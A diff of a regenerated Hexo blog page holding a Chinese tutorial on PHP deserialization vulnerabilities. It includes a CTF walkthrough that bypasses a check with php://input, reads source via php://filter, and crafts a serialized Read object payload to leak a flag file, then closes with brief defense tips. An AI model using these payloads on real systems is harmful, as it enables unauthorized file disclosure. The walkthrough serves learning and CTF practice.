@@ -15,11 +15,11 @@
 
 
 <html class="theme-next mist use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
 
 
 
@@ -44,9 +44,9 @@
 
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
 
-<link rel="stylesheet" href="/css/main.css?v=7.1.0"/>
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="https://github.com/Windylh/image/raw/master/icon.ico?v=7.1.0">
@@ -96,22 +96,21 @@
 
 
 
-  <meta name="description" content="0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。
-php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在">
+  <meta name="description" content="0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。 php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在">
+<meta name="keywords" content="Web,php">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php反序列化漏洞利用">
 <meta property="og:url" content="http://yoursite.com/2017/04/09/php反序列化漏洞利用/index.html">
-<meta property="og:site_name" content="Windylh's blog">
-<meta property="og:description" content="0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。
-php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在">
+<meta property="og:site_name" content="Windylh&#39;s blog">
+<meta property="og:description" content="0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。 php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.4.9/1-1.png">
 <meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.4.9/1-2.png">
 <meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.4.9/1-3.png">
 <meta property="og:updated_time" content="2019-07-15T10:24:50.027Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="php反序列化漏洞利用">
-<meta name="twitter:description" content="0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。
-php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在">
+<meta name="twitter:description" content="0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。 php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在">
 <meta name="twitter:image" content="https://github.com/Windylh/image/raw/master/2017.4.9/1-1.png">
 
 
@@ -120,7 +119,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2017/04/09/php反序列化漏洞利用/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/04/09/php反序列化漏洞利用/">
 
 
 
@@ -198,7 +197,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
   </div>
 
   <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
+    <button aria-label="Toggle navigation bar">
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
@@ -226,7 +225,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
 
     
 
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Startseite</a>
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
 
   </li>
         
@@ -243,7 +242,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
 
     
 
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>Schlagwörter</a>
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
 
   </li>
         
@@ -260,7 +259,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
 
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>Archiv</a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
 
   </li>
 
@@ -312,16 +311,16 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/09/php反序列化漏洞利用/"/>
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/09/php反序列化漏洞利用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Windylh"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"/>
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Windylh's blog"/>
+      <meta itemprop="name" content="Windylh's blog">
     </span>
 
     
@@ -348,14 +347,14 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
 
               
                 
               
 
-              <time title="Erstellt: 2017-04-09 00:00:00" itemprop="dateCreated datePublished" datetime="2017-04-09T00:00:00+08:00">2017-04-09</time>
+              <time title="Created: 2017-04-09 00:00:00" itemprop="dateCreated datePublished" datetime="2017-04-09T00:00:00+08:00">2017-04-09</time>
             
 
             
@@ -370,9 +369,9 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 
-                  <span class="post-meta-item-text">Bearbeitet am</span>
+                  <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Geändert am: 2019-07-15 18:24:50" itemprop="dateModified" datetime="2019-07-15T18:24:50+08:00">2019-07-15</time>
+                <time title="Modified: 2019-07-15 18:24:50" itemprop="dateModified" datetime="2019-07-15T18:24:50+08:00">2019-07-15</time>
               
             
           </span>
@@ -392,7 +391,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
                 <i class="fa fa-eye"></i>
               </span>
               
-                <span class="post-meta-item-text">Aufrufe: </span>
+                <span class="post-meta-item-text">Views: </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
@@ -422,8 +421,8 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
 <p>这也是我们要去利用的地方。</p>
 <a id="more"></a>
 <h2 id="0x01-理解序列化的字符串"><a href="#0x01-理解序列化的字符串" class="headerlink" title="0x01 理解序列化的字符串"></a>0x01 理解序列化的字符串</h2><p>要学习反序列化漏洞，还要明白序列化后的字符串的意义，方便我们构造payload。</p>
-<p>例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> <span class="class"><span class="keyword">class</span> <span class="title">foo</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $filename=<span class="string">'233.txt'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$a = <span class="keyword">new</span> foo();</div><div class="line"><span class="keyword">echo</span> $a-&gt;filename.<span class="string">'&lt;br /&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> serialize($a);</div></pre></td></tr></table></figure></p>
-<p>运行这个php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">233.txt</div><div class="line">O:3:&quot;foo&quot;:1:&#123;s:8:&quot;filename&quot;;s:7:&quot;233.txt&quot;;&#125;</div></pre></td></tr></table></figure></p>
+<p>例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">foo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'233.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> foo();</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;filename.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure></p>
+<p>运行这个php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">233.txt</span><br><span class="line">O:3:&quot;foo&quot;:1:&#123;s:8:&quot;filename&quot;;s:7:&quot;233.txt&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>第二行就是我们序列化之后的内容，我们来分析一下</p>
 <blockquote>
 <p>O：对象，对象名长度为3，名字为“foo”，有一个参数。</p>
@@ -443,40 +442,72 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
 <h2 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h2><p>魔术方法不需要调用就可以执行。<br>常见的魔术方法如下：</p>
 <blockquote>
 <p>__construct() 类的构造函数</p>
+</blockquote>
+<blockquote>
 <p>__destruct() 类的析构函数</p>
+</blockquote>
+<blockquote>
 <p>__call() 在对象中调用一个不可访问方法时调用</p>
+</blockquote>
+<blockquote>
 <p>__callStatic() 用静态方式中调用一个不可访问方法时调用</p>
+</blockquote>
+<blockquote>
 <p>__get() 获得一个类的成员变量时调用</p>
+</blockquote>
+<blockquote>
 <p>__set() 设置一个类的成员变量时调用</p>
+</blockquote>
+<blockquote>
 <p>__isset() 当对不可访问属性调用isset()或empty()时调用</p>
+</blockquote>
+<blockquote>
 <p>__unset() 当对不可访问属性调用unset()时被调用</p>
+</blockquote>
+<blockquote>
 <p>__sleep() 执行serialize()时，先会调用这个函数</p>
+</blockquote>
+<blockquote>
 <p>__wakeup() 执行unserialize()时，先会调用这个函数</p>
+</blockquote>
+<blockquote>
 <p>__toString() 类被当成字符串时的回应方法</p>
+</blockquote>
+<blockquote>
 <p>__invoke() 调用函数的方式调用一个对象时的回应方法</p>
+</blockquote>
+<blockquote>
 <p>__set_state() 调用var_export()导出类时，此静态方法会被调用</p>
+</blockquote>
+<blockquote>
 <p>__clone() 当对象复制完成时调用</p>
+</blockquote>
+<blockquote>
 <p>__debugInfo() 打印所需调试信息</p>
+</blockquote>
+<blockquote>
 <p>__autoload() 尝试加载未定义的类</p>
 </blockquote>
 <h2 id="0x03-实战"><a href="#0x03-实战" class="headerlink" title="0x03 实战"></a>0x03 实战</h2><p>HBctf中有一道综合性的web题，最后的部分刚好是反序列化。</p>
-<p>查看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">you are not admin ! </div><div class="line">&lt;!--</div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div><div class="line"> --&gt;</div></pre></td></tr></table></figure></p>
+<p>查看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">you are not admin ! </span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure></p>
 <p>直接在get中构造赋值并没有用。</p>
 <p>想到了php的伪协议 <code>php：//input</code>，同时post数据<code>the user is admin</code><br><img src="https://github.com/Windylh/image/raw/master/2017.4.9/1-1.png" alt="1-1"><br>第一步绕过，到了<code>include($file); //class.php</code>，提示我读取class.php</p>
 <p>可以运用伪协议<code>php://filter</code>读取文件</p>
-<p>利用方法：<code>php://filter/convert.base64-encode/resource=xxxxx.php</code><br><img src="https://github.com/Windylh/image/raw/master/2017.4.9/1-2.png" alt="1-2"><br>得到base64编码后的class.php,解密得：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</div><div class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>利用方法：<code>php://filter/convert.base64-encode/resource=xxxxx.php</code><br><img src="https://github.com/Windylh/image/raw/master/2017.4.9/1-2.png" alt="1-2"><br>得到base64编码后的class.php,解密得：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>这里定义了一个Read类，有魔术方法__toString。</p>
 <p>然后我用php伪协议读取了一下index.php，真正的源码如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment"># index.php</span></div><div class="line">$user = <span class="keyword">isset</span>($_GET[<span class="string">'user'</span>])?$_GET[<span class="string">"user"</span>]:<span class="string">""</span>;</div><div class="line">$file = <span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])?$_GET[<span class="string">"file"</span>]:<span class="string">"class.php"</span>;</div><div class="line">$pass = <span class="keyword">isset</span>($_GET[<span class="string">"pass"</span>])?$_GET[<span class="string">"pass"</span>]:<span class="string">""</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">        $pass = unserialize($pass);</div><div class="line">        <span class="keyword">echo</span> $pass;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># index.php</span></span><br><span class="line">$user = <span class="keyword">isset</span>($_GET[<span class="string">'user'</span>])?$_GET[<span class="string">"user"</span>]:<span class="string">""</span>;</span><br><span class="line">$file = <span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])?$_GET[<span class="string">"file"</span>]:<span class="string">"class.php"</span>;</span><br><span class="line">$pass = <span class="keyword">isset</span>($_GET[<span class="string">"pass"</span>])?$_GET[<span class="string">"pass"</span>]:<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        <span class="keyword">echo</span> $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>有unserialize()，有class类和魔术方法__toString()，我们就可以进行反序列化攻击了。</p>
 <p>构造：<code>O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;}</code></p>
 <p><img src="https://github.com/Windylh/image/raw/master/2017.4.9/1-3.png" alt="1-3"></p>
 <p>解base64编码，得到flag。</p>
 <p>bugku中的一个题与这个类似，有兴趣的可以去尝试一下</p>
-<p><a href="http://120.24.86.145:8006/test1/" target="_blank" rel="external">http://120.24.86.145:8006/test1/index.php</a></p>
+<p><a href="http://120.24.86.145:8006/test1/" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/index.php</a></p>
 <h2 id="0x04-如何防御php反序列化漏洞"><a href="#0x04-如何防御php反序列化漏洞" class="headerlink" title="0x04 如何防御php反序列化漏洞"></a>0x04 如何防御php反序列化漏洞</h2><p>防御php反序列化漏洞很简单。</p>
 <blockquote>
 <p>1、对参数进行过滤转义处理。</p>
+</blockquote>
+<blockquote>
 <p>2、换用更安全的函数。</p>
 </blockquote>
 
@@ -575,10 +606,10 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
       
         <ul class="sidebar-nav motion-element">
           <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Inhaltsverzeichnis
+            Table of Contents
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Übersicht
+            Overview
           </li>
         </ul>
       
@@ -587,9 +618,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image"
-                src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"
-                alt="Windylh"/>
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg" alt="Windylh">
             
               <p class="site-author-name" itemprop="name">Windylh</p>
               <div class="site-description motion-element" itemprop="description"></div>
@@ -603,7 +632,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
                   <a href="/archives/">
                 
                     <span class="site-state-item-count">32</span>
-                    <span class="site-state-item-name">Artikel</span>
+                    <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
               
@@ -648,7 +677,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
                       
                     
                     <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">schlagwörter</span>
+                    <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
               
@@ -793,7 +822,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
 </div>
 
 
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.2.2</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
 
 
 
@@ -801,7 +830,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
 
 
 
-  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.1.0</div>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.1.0</div>
 
 
 
